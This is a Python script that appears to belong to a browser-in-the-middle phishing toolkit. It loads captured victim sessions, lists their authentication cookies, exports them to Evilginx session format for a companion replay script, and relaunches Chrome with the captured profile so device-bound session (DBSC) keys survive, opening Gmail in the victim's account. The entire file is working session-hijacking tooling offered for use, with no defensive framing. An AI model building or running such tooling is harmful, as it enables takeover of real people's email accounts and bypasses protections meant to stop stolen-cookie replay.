#!/usr/bin/env python3
"""
extract_session.py -- Converts a BitM session to Evilginx format
for compatibility with replay_evilginx.py, or relaunches Chrome with the
captured profile (DBSC-safe replay).

Modes:
  --mode export   Export cookies to Evilginx session.json format
  --mode replay   Relaunch Chrome with the captured profile (preserves DBSC)
  --mode show     Display captured cookies (default)

Examples:
  # View captured cookies
  python3 extract_session.py sessions/bitm_session_20261015_1423.json

  # Export for replay_evilginx.py
  python3 extract_session.py sessions/bitm_session_20261015_1423.json --mode export

  # Relaunch Chrome with profile (DBSC intact)
  python3 extract_session.py sessions/bitm_session_20261015_1423.json --mode replay
"""

import argparse
import json
import subprocess
import sys
from collections import defaultdict
from pathlib import Path


def load_session(path):
    data = json.loads(Path(path).read_text())
    return data


def mode_show(session):
    print(f"Timestamp : {session.get('timestamp', '?')}")
    print(f"Status    : {session.get('status', '?')}")
    print(f"Final URL : {session.get('final_url', '?')}")
    print(f"Profile   : {session.get('chrome_profile', '?')}")
    print()

    auth = session.get("auth_cookies", [])
    all_cookies = session.get("cookies", [])
    print(f"Total cookies : {len(all_cookies)}")
    print(f"Auth cookies  : {len(auth)}")
    print()

    if auth:
        print("--- Authentication cookies ---")
        for c in auth:
            exp = c.get("expires", -1)
            exp_str = "session" if exp < 0 else str(int(exp))
            print(f"  {c['name']:30s} {c.get('domain',''):20s} exp={exp_str}")
    else:
        print("[!] No authentication cookies captured")


def mode_export(session, output_path):
    """Convert to Evilginx session.json format."""
    cookies = session.get("cookies", [])

    tokens = defaultdict(lambda: {"cookies": []})
    for c in cookies:
        domain = c.get("domain", "")
        cookie = {
            "name": c["name"],
            "value": c["value"],
            "domain": domain,
            "path": c.get("path", "/"),
            "secure": c.get("secure", True),
            "httpOnly": c.get("httpOnly", False),
        }
        exp = c.get("expires", -1)
        if exp and exp > 0:
            cookie["expires"] = int(exp)
        ss = c.get("sameSite", "Lax")
        if ss in ("Strict", "Lax", "None"):
            cookie["sameSite"] = ss
        else:
            cookie["sameSite"] = "Lax"

        tokens[domain]["cookies"].append(cookie)

    evilginx_session = {
        "username": "",
        "tokens": dict(tokens),
        "bitm_source": True,
        "timestamp": session.get("timestamp", ""),
        "final_url": session.get("final_url", ""),
    }

    output = Path(output_path)
    output.parent.mkdir(parents=True, exist_ok=True)
    output.write_text(json.dumps(evilginx_session, indent=2, default=str))
    print(f"[+] Evilginx session exported: {output}")
    print(f"    Compatible with: python3 replay_evilginx.py --session-file {output}")


def mode_replay(session):
    """Relaunch Chrome with the captured profile (DBSC intact)."""
    profile = session.get("chrome_profile")
    if not profile or not Path(profile).exists():
        sys.exit(f"[!] Chrome profile not found: {profile}")

    print(f"[+] Launching Chrome with profile: {profile}")
    print("    Cookies AND DBSC keys are preserved.")
    print("    Close Chrome to exit.\n")

    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            ctx = p.chromium.launch_persistent_context(
                profile,
                headless=False,
                channel="chrome",
                args=["--no-first-run", "--no-default-browser-check"],
                viewport={"width": 1280, "height": 900},
            )
            page = ctx.pages[0] if ctx.pages else ctx.new_page()
            page.goto("https://mail.google.com")
            print("[*] Chrome opened on Gmail. Close the browser to quit.")
            try:
                page.wait_for_event("close", timeout=0)
            except Exception:
                pass
            ctx.close()
    except ImportError:
        cmd = ["google-chrome", f"--user-data-dir={profile}", "https://mail.google.com"]
        print(f"    Fallback: {' '.join(cmd)}")
        subprocess.run(cmd)


def main():
    p = argparse.ArgumentParser(
        description="BitM session extraction and replay"
    )
    p.add_argument("session_file", help="bitm_session_*.json file")
    p.add_argument(
        "--mode", choices=["show", "export", "replay"], default="show",
        help="Mode: show (default), export (Evilginx format), replay (Chrome+profile)"
    )
    p.add_argument(
        "--output", default=None,
        help="Output file for --mode export (default: session_evilginx.json)"
    )
    args = p.parse_args()

    session = load_session(args.session_file)

    if args.mode == "show":
        mode_show(session)
    elif args.mode == "export":
        out = args.output or str(
            Path(args.session_file).parent / "session_evilginx.json"
        )
        mode_export(session, out)
    elif args.mode == "replay":
        mode_replay(session)


if __name__ == "__main__":
    main()
